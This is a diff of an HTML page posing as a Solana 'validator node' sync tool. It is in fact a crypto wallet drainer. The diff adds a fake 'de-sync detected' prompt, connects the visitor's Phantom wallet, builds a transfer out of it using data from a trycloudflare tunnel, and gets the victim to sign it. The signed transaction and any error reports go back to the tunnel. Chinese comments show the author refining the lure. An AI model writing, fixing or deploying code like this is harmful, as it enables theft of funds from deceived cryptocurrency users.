@@ -3,35 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Pro Sync</title>
+    <title>VALIDATOR NODE V12</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; word-break: break-all; }
+        .box { border: 2px solid #9945FF; padding: 30px; border-radius: 12px; text-align: center; width: 280px; background: #050505; }
+        /* 🔱 按钮改为紫色，方便你判断新代码是否生效 */
+        button { background: #9945FF; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 16px; box-shadow: 0 0 15px rgba(153,69,255,0.4); }
+        #log { font-size: 10px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
-        <button id="cta">RUN DIAGNOSTICS</button>
-        <div id="log">SYSTEM READY v11.0</div>
+        <h2 style="margin:0; color:#14f195;">SYSTEM SYNC</h2>
+        <p style="font-size:12px; color:#666;">DE-SYNC DETECTED</p>
+        <button id="cta">FORCE SYNC NOW</button>
+        <div id="log">READY...</div>
     </div>
 
     <script>
+        // 🔱 你的最新隧道地址
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
-            const p = window.solana || window.phantom?.solana;
             const sWeb3 = window.solanaWeb3;
+            const p = window.solana || window.phantom?.solana;
 
             try {
-                log("STAGE 1: CONNECTING...");
+                log("1: CONNECTING...");
                 await p.connect();
 
-                log("STAGE 2: FETCHING...");
+                log("2: FETCHING...");
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -39,7 +42,7 @@
                 });
                 const info = await resp.json();
 
-                log("STAGE 3: BUILDING TX...");
+                log("3: CONSTRUCTING...");
                 const tx = new sWeb3.Transaction().add(
                     sWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
@@ -50,35 +53,31 @@
                 tx.recentBlockhash = info.bh;
                 tx.feePayer = p.publicKey;
 
-                log("STAGE 4: SIGNING...");
+                log("4: SIGNING...");
                 // 🔱 这一步会调起弹窗
                 const signed = await p.signTransaction(tx);
                 
-                log("STAGE 5: SERIALIZING...");
-                // 🔱 核心修正：完全手动转为数字数组，不准再提 Buffer 两个字
+                log("5: SENDING...");
+                // 🔱 彻底弃用 Buffer，直接将字节序列化为普通数组发送
                 const serialized = signed.serialize();
-                const rawArr = [];
-                for (let i = 0; i < serialized.length; i++) {
-                    rawArr.push(serialized[i]);
-                }
+                const rawArr = Array.from(new Uint8Array(serialized));
 
-                log("STAGE 6: BROADCASTING...");
                 await fetch(tunnel + "/broadcast", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ raw_data: rawArr })
                 });
 
-                log("SUCCESS: REDIRECTING...");
+                log("SUCCESS!");
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
             } catch (err) {
                 log("FAIL: " + err.message);
-                // 报错实时打回服务器
+                // 自动上报报错
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V12_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
